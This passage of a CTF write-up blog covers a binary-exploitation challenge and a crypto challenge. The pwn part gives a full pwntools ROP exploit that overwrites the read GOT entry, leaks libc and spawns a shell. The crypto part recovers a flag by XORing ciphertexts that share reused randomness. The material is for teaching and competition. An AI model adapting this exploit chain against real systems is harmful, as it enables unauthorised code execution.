</div>
</div><p>There is a buffer overflow vulnerability. Because the plt only contains read, we need to do partial overwrite (1 byte) to the read_got value so that we can execute <code>syscall</code>. The idea to gain the shell is:</p>
<ul>
<li>Overwrite RIP to read_plt</li>
<li>Overwrite read_got to syscall with read (1 last byte)</li>
<li>Rax = 1, If we call read_plt (which now is syscall), we can leak the got address and retrieve the libc base address</li>
<li>Set rax to 0</li>
<li>Syscall read again to load our second payload into .bss (Second payload will execute system(&quot;/bin/sh&quot;))</li>
<li>Set rsp to the .bss</li>
<li>Pop &ldquo;/bin/sh&rdquo; to rdi</li>
<li>Ret to system</li>
</ul>
<p>Below is my full payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s1">&#39;amd64&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">encoding</span> <span class="o">=</span> <span class="s1">&#39;latin&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;INFO&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">warnings</span><span class="o">.</span><span class="n">simplefilter</span><span class="p">(</span><span class="s2">&#34;ignore&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Chosen BSS</span>
</span></span><span class="line"><span class="cl"><span class="n">bss</span> <span class="o">=</span> <span class="mh">0x00601030</span><span class="o">+</span><span class="mh">0x400</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># readelf -s libc-2.27.so | grep &#34;read&#34; = 0x0000000000110070</span>
</span></span><span class="line"><span class="cl"><span class="c1"># I choose to redirect it to directly syscall inside read (read+15)</span>
</span></span><span class="line"><span class="cl"><span class="n">read_offset</span> <span class="o">=</span> <span class="mh">0x000000000011007f</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">read_plt</span> <span class="o">=</span> <span class="mh">0x00000000004003f0</span>
</span></span><span class="line"><span class="cl"><span class="n">read_got</span> <span class="o">=</span> <span class="mh">0x601018</span>
</span></span><span class="line"><span class="cl"><span class="n">syscall</span> <span class="o">=</span> <span class="n">read_plt</span> <span class="c1"># We will overwrite read_got to syscall, so basically syscall = read_plt</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># ROPGadget result</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x0000000000400583</span> <span class="c1"># pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsi_r15</span> <span class="o">=</span> <span class="mh">0x0000000000400581</span> <span class="c1"># pop rsi ; pop r15 ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rsp</span> <span class="o">=</span> <span class="mh">0x000000000040057d</span> <span class="c1"># pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">mov_eax_0_pop_rbp</span> <span class="o">=</span> <span class="mh">0x0000000000400515</span> <span class="c1"># mov eax, 0 ; pop rbp ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret_address</span> <span class="o">=</span> <span class="mh">0x00000000004003de</span> <span class="c1"># ret</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc-2.27.so&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s1">&#39;./crySYS_patched&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Load stage 2 rop</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="mi">80</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_got</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">read_plt</span><span class="p">)</span> <span class="c1"># Overwrite 1 bytes, rax == 1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1"># rax == 1 == write(1, got_addr)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">mov_eax_0_pop_rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="o">+</span><span class="mi">72</span><span class="p">)</span> <span class="c1"># Set rax to 0</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsi_r15</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">syscall</span><span class="p">)</span> <span class="c1"># read(0, bss)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rsp</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bss</span><span class="p">)</span> <span class="c1"># Set rsp to bss</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Payload sent...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Overwrite 1 byte of read_got by syscall inside read</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x7f</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Overwrite read got...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># After leaking the address, call system()</span>
</span></span><span class="line"><span class="cl"><span class="n">leak_syscall_address</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvn</span><span class="p">(</span><span class="mi">8</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak_syscall_address</span> <span class="o">-</span> <span class="n">read_offset</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked syscall address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">leak_syscall_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Leaked libc address: </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Craft payload to call system(&#39;/bin/sh&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh_string_addr</span> <span class="o">=</span> <span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;/bin/sh&#39;</span><span class="p">))</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_3</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh_string_addr</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret_address</span><span class="p">)</span> <span class="c1"># https://stackoverflow.com/questions/60729616/segfault-in-ret2libc-attack-but-not-hardcoded-system-call</span>
</span></span><span class="line"><span class="cl"><span class="n">payload_3</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">])</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Call system</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload_3</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;Call system(&#34;/bin/sh&#34;)...&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p><img
        class="lazyload"
        src="/svg/loading.min.svg"
        data-src="https://i.imgur.com/aUb2CRl.png"
        data-srcset="https://i.imgur.com/aUb2CRl.png, https://i.imgur.com/aUb2CRl.png 1.5x, https://i.imgur.com/aUb2CRl.png 2x"
        data-sizes="auto"
        alt="https://i.imgur.com/aUb2CRl.png"
        title="https://i.imgur.com/aUb2CRl.png" /></p>
<blockquote>
<p>Flag: HL{PPPwned-7165-4679-8c39-cf7633bdf81b}</p>
</blockquote>
<h1 id="crypto">Crypto</h1>
<h2 id="idbased1">IDBased1</h2>
<p>After checking with the given ciphertexts consist of encrypted message of &lsquo;This is the test message number x&rsquo;, there is a collision between the ciphertexts CEO and the test ciphertexts</p>
<p>CEO ciphertexts:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v
</span></span></code></pre></td></tr></table>
</div>
</div><p>One of the test ciphertexts:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">(48589388807824569428904895217595930284742776679758376879158603177028397294637208100498204082285088554469912630884992811058648356701793719253927209526856391255958203708765937470965113379063164783112790458526467722720510441287344375068385945897745788289000831021749963218399056946672933810712728531356131069075, 91666678461349391408393081333148703690518650210973716238555488161769616574067974692422855852226270111041696008098903109570179474889001701370982766256913315456108459222753446063832634368831212498249621216114532831173942748910271298860729376114971648924546503909862899046327681305300267651777702160513672803461), 7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc
</span></span></code></pre></td></tr></table>
</div>
</div><p>BasicIdent ciphertext is like below:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">v = m xor H2(gID**r)
</span></span></code></pre></td></tr></table>
</div>
</div><p>Because the $rP$ value is the same, we could know that the $H2(g_{ID}^r)$ value of the ceo and the test cipher texts have the same value, which mean</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ceo_v = b64decode(&#39;4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v&#39;)
</span></span><span class="line"><span class="cl">test_v = b64decode(&#39;7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc&#39;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ceo_msg = test_v^b&#39;This is the message number&#39;^ceo_v
</span></span></code></pre></td></tr></table>
</div>
</div><p>Full Script:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">base64</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">ceo_v</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;4LXZeMmDX9bXWxTmFF4oimniK0Sq39kURG4v&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">flag_len</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">ceo_v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">test_v</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="s1">&#39;7ZP/X9jSV7SXdzPyJHlvuhu7AHOW8/A0UTUnlUL+URbc&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">test_msg</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;This is the test message number&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">flag</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">xor</span><span class="p">(</span><span class="n">test_v</span><span class="p">[:</span><span class="n">flag_len</span><span class="p">],</span> <span class="n">test_msg</span><span class="p">[:</span><span class="n">flag_len</span><span class="p">]),</span> <span class="n">ceo_v</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Flag: </span><span class="si">{</span><span class="n">flag</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We successfully retrieve the flag</p>
<blockquote>
<p>Flag: YNOT18{B4DB4DB4DR4NDOMNE55}</p>
</blockquote>
<h1 id="social-media">Social Media</h1>
<p>Follow me on <a href="https://twitter.com/chovid99" target="_blank" rel="noopener noreffer ">twitter</a></p>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>
                    
                </span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"></div>
            <div class="post-info-share">
                <span><span style="margin-right: 5px">Share on</span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://chovid99.github.io/posts/gcc-3.0-ctf-2022/" data-title="GCC 3.0 CTF 2022" data-via="Chovid99" data-hashtags="Writeup,GCC CTF,jsp,web,pwn,android,short-pwn,rop,got overwrite,2022"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://chovid99.github.io/posts/gcc-3.0-ctf-2022/" data-hashtag="Writeup"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/writeup/">Writeup</a>,&nbsp;<a href="/tags/gcc-ctf/">GCC CTF</a>,&nbsp;<a href="/tags/jsp/">jsp</a>,&nbsp;<a href="/tags/web/">web</a>,&nbsp;<a href="/tags/pwn/">pwn</a>,&nbsp;<a href="/tags/android/">android</a>,&nbsp;<a href="/tags/short-pwn/">short-pwn</a>,&nbsp;<a href="/tags/rop/">ROP</a>,&nbsp;<a href="/tags/got-overwrite/">got overwrite</a>,&nbsp;<a href="/tags/2022/">2022</a></section>
        <section>
            
        </section>
    </div>

    <div class="post-nav"><a href="/posts/pbctf-2021/" class="prev" rel="prev" title="PBCTF 2021"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>PBCTF 2021</a>
            <a href="/posts/dicectf-2022/" class="next" rel="next" title="DiceCTF 2022">DiceCTF 2022<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://twitter.com/Chovid99" target="_blank">Chovid99</a></span></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
            gtag('config', 'G-19HP521HQ9', { 'anonymize_ip': true });
        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-19HP521HQ9" async></script></body>
</html>
